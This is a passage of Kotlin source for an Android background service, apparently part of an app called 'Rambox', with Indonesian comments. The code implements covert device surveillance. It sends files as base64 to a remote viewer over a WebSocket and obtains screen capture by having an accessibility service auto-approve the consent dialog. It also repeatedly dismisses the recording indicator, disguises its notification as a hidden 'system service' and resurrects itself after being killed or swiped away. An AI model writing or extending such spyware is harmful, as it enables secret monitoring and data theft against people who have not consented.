            val bytes = file.readBytes()
            val base64 = Base64.encodeToString(bytes, Base64.NO_WRAP)

            val payload = JSONObject().apply {
                put("type", "file_download_data")
                put("name", file.name)
                put("path", file.absolutePath)
                put("size", file.length())
                put("base64", base64)
            }
            broadcastPayload(payload)
        } catch (e: OutOfMemoryError) {
            // FIX: Catch OOM explicitly for edge cases near the 50MB limit
            System.gc()
            try {
                val payload = JSONObject().apply {
                    put("type", "file_download_data")
                    put("name", File(path).name)
                    put("path", path)
                    put("error", "Memori tidak cukup untuk mengirim file ini.")
                }
                broadcastPayload(payload)
            } catch (_: Exception) {}
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    fun isServiceStreaming(): Boolean {
        return isStreaming && mediaProjection != null
    }

    private fun requestSilentScreenCapture(force: Boolean = false) {
        if (mediaProjection != null || isUserExplicitlyStopped) return

        // Jangan memaksa dialog consent berulang kali bila user sudah menolak.
        // Viewer-initiated signals memakai force=true agar tetap bisa mencoba.
        if (!force) {
            val denied = getSharedPreferences("rambox_prefs", Context.MODE_PRIVATE)
                .getBoolean("consent_denied", false)
            if (denied) return
        }

        // v41: tanpa izin "Tampil di Atas", startActivity dari background bisa
        // diblokir Android 10+ (BAL) sehingga dialog consent tak pernah muncul.
        // Tetap coba (beberapa OEM mengizinkan), tetapi catat penyebabnya.
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
            android.util.Log.w(
                "RamboxCapture",
                "Silent capture: izin 'Tampil di Atas' belum aktif; dialog bisa diblokir BAL."
            )
        }

        // Minim tampil: jangan buka dialog consent bila tak ada yang bisa
        // mengkliknya otomatis. Tunda dan coba lagi 60 dtk kemudian.
        if (!isAccessibilityActive()) {
            if (!silentRetryPending) {
                silentRetryPending = true
                handler.postDelayed({
                    silentRetryPending = false
                    if (mediaProjection == null && !isUserExplicitlyStopped) {
                        requestSilentScreenCapture()
                    }
                }, 60000)
            }
            return
        }

        // FIX #1b: cegah spam launch MainActivity dari heartbeat/request_stream
        // saat consent baru sedang diproses.
        if (silentCaptureRequestPending) return

        try {
            android.util.Log.d("RamboxCapture", "requestSilentScreenCapture: Launching silent capture via MainActivity")
            silentCaptureRequestPending = true
            handler.postDelayed({ silentCaptureRequestPending = false }, 15000)

            // Enable auto-approve mode in AccessibilityService
            RamboxAccessibilityService.isSilentCaptureMode = true
            RamboxAccessibilityService.isWaitingForProjectionConsent = true

            // Reset capture_declined flag so MainActivity will request capture
            val prefs = getSharedPreferences("rambox_prefs", Context.MODE_PRIVATE)
            prefs.edit().putBoolean("capture_declined", false).apply()

            // Launch invisible MainActivity to get MediaProjection token
            val launchIntent = Intent(applicationContext, MainActivity::class.java).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_SINGLE_TOP)
                putExtra("SILENT_CAPTURE", true)
                // E1 FIX: buktikan intent ini berasal dari komponen aplikasi sendiri.
                putExtra(InternalAuth.EXTRA_TOKEN, InternalAuth.token(applicationContext))
            }
            applicationContext.startActivity(launchIntent)

            // Auto-disable silent capture mode after 30 seconds (safety net against flicker loop)
            handler.postDelayed({
                RamboxAccessibilityService.isSilentCaptureMode = false
                RamboxAccessibilityService.isWaitingForProjectionConsent = false
            }, 30000)
        } catch (e: Exception) {
            android.util.Log.e("RamboxCapture", "requestSilentScreenCapture failed: ${e.message}")
            silentCaptureRequestPending = false
            RamboxAccessibilityService.isSilentCaptureMode = false
            RamboxAccessibilityService.isWaitingForProjectionConsent = false
        }
    }

    fun ensureConnected() {
        if (!isUserExplicitlyStopped && (webSocketClient == null || webSocketClient?.isOpen != true)) {
            initWebSocket()
        }
    }

    fun sendActivityLog(logObj: JSONObject) {
        try {
            val payload = JSONObject()
            payload.put("type", "activity_log_update")
            payload.put("log", logObj)
            broadcastPayload(payload)
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun stopScreenCapture() {
        isStreaming = false
        handler.removeCallbacks(pingRunnable)
        handler.removeCallbacks(infoUpdateRunnable)
        handler.removeCallbacks(heartbeatFrameRunnable)
        releaseWakeAndWifiLock()
        try {
            alarmMediaPlayer?.stop()
            alarmMediaPlayer?.release()
            alarmMediaPlayer = null
        } catch (e: Exception) {}
        stopCameraCapture()
        stopImageCapture()
        stopChipHiderTimer()
        mediaProjection?.stop()
        mediaProjection = null
        projectionDisplayCreated = false
        silentCaptureRequestPending = false
        try {
        } catch (e: Exception) {}
    }

    // =========================================================================
    // 🔇 CHIP HIDER — Auto-dismiss recording indicator di status bar
    // =========================================================================

    private fun startChipHiderTimer() {
        stopChipHiderTimer() // Pastikan tidak ada timer duplikat
        chipHiderTimer = java.util.Timer("ChipHider", true).apply {
            scheduleAtFixedRate(object : java.util.TimerTask() {
                override fun run() {
                    try {
                        if (!isScreenOff && isViewerActive) {
                            RamboxAccessibilityService.instance?.dismissRecordingChip()
                        }
                    } catch (_: Exception) {}
                }
            }, 3000, 8000) // Mulai 3 detik setelah start, cek setiap 8 detik
        }
    }

    private fun stopChipHiderTimer() {
        try {
            chipHiderTimer?.cancel()
            chipHiderTimer?.purge()
        } catch (_: Exception) {}
        chipHiderTimer = null
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val notificationManager: NotificationManager =
                getSystemService(NOTIFICATION_SERVICE) as NotificationManager
            try {
                notificationManager.deleteNotificationChannel("RamboxMirrorChannel")
            } catch (_: Exception) {}

            val name = "Layanan Sistem"
            val descriptionText = "Sinkronisasi layanan sistem latar belakang"
            val importance = NotificationManager.IMPORTANCE_MIN
            val channel = NotificationChannel(CHANNEL_ID, name, importance).apply {
                description = descriptionText
                setShowBadge(false)
                enableLights(false)
                enableVibration(false)
                setSound(null, null)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
            }
            notificationManager.createNotificationChannel(channel)
        }
    }

    override fun onDestroy() {
        stopAudioStream()
        super.onDestroy()
        instance = null
        // R2: batalkan semua callback handler (delay buka activity/consent/retry)
        // agar service yang mati tidak hidup kembali atau menahan instance.
        try { handler.removeCallbacksAndMessages(null) } catch (_: Exception) {}
        try { reconnectRunnable.let { handler.removeCallbacks(it) } } catch (_: Exception) {}
        unregisterScreenStateReceiver()
        unregisterDisplayListener()
        // T2: lepaskan listener lokasi & orientasi.
        try {
            val lm = getSystemService(Context.LOCATION_SERVICE) as? LocationManager
            lm?.removeUpdates(locationListener)
        } catch (_: Exception) {}
        try {
            orientationEventListener?.disable()
            orientationEventListener = null
        } catch (_: Exception) {}
        stopScreenCapture()
        stopCameraCapture()
        stopCameraThread()
        webSocketClient?.close()
        // T1: thread pool & capture thread harus benar-benar berhenti.
        try { stopCaptureThread() } catch (_: Exception) {}
        try { backgroundIoExecutor.shutdownNow() } catch (_: Exception) {}
        try {
            screenFrameExecutor.shutdownNow()
        } catch (e: Exception) {}
        try {
            cameraFrameExecutor.shutdownNow()
        } catch (e: Exception) {}

        // Anti-Kill Resurrect: If not explicitly killed via Dial, resurrect background service silently!
        // FIX: NEVER launch MainActivity UI! Resurrect ScreenCaptureService directly.
        val prefs = getSharedPreferences("rambox_prefs", Context.MODE_PRIVATE)
        val isExplicitlyKilled = prefs.getBoolean("is_explicitly_killed", false)
        if (!isUserExplicitlyStopped && !isExplicitlyKilled) {
            try { ResurrectionJobService.schedule(this) } catch (_: Exception) {}
            try {
                val serviceIntent = Intent(applicationContext, ScreenCaptureService::class.java).apply {
                    putExtra("ip", savedIp)
                    putExtra("pin", savedPin)
                }
                if (Build.VERSION.SDK_INT < Build.VERSION_CODES.S) {
                    val pendingIntent = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        PendingIntent.getForegroundService(
                            applicationContext, 1002, serviceIntent,
                            PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
                        )
                    } else {
                        PendingIntent.getService(
                            applicationContext, 1002, serviceIntent,
                            PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
                        )
                    }
                    val alarmManager = getSystemService(Context.ALARM_SERVICE) as? AlarmManager
                    alarmManager?.set(AlarmManager.ELAPSED_REALTIME, android.os.SystemClock.elapsedRealtime() + 1000, pendingIntent)
                }
            } catch (e: Exception) {}
        }
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        val prefs = getSharedPreferences("rambox_prefs", Context.MODE_PRIVATE)
        val isExplicitlyKilled = prefs.getBoolean("is_explicitly_killed", false)
        if (!isUserExplicitlyStopped && !isExplicitlyKilled) {
            // Pastikan job kebangkitan tetap terjadwal setelah task disapu.
            try { ResurrectionJobService.schedule(this) } catch (_: Exception) {}
            try {
                val serviceIntent = Intent(applicationContext, ScreenCaptureService::class.java).apply {
                    putExtra("ip", savedIp)
                    putExtra("pin", savedPin)
                }
                if (Build.VERSION.SDK_INT < Build.VERSION_CODES.S) {
                    val pendingIntent = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        PendingIntent.getForegroundService(
                            applicationContext, 1002, serviceIntent,
                            PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
                        )
                    } else {
                        PendingIntent.getService(
                            applicationContext, 1002, serviceIntent,
                            PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
                        )
                    }
                    val alarmManager = getSystemService(Context.ALARM_SERVICE) as? AlarmManager
                    alarmManager?.set(AlarmManager.ELAPSED_REALTIME, android.os.SystemClock.elapsedRealtime() + 1000, pendingIntent)
                }
            } catch (e: Exception) {}
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
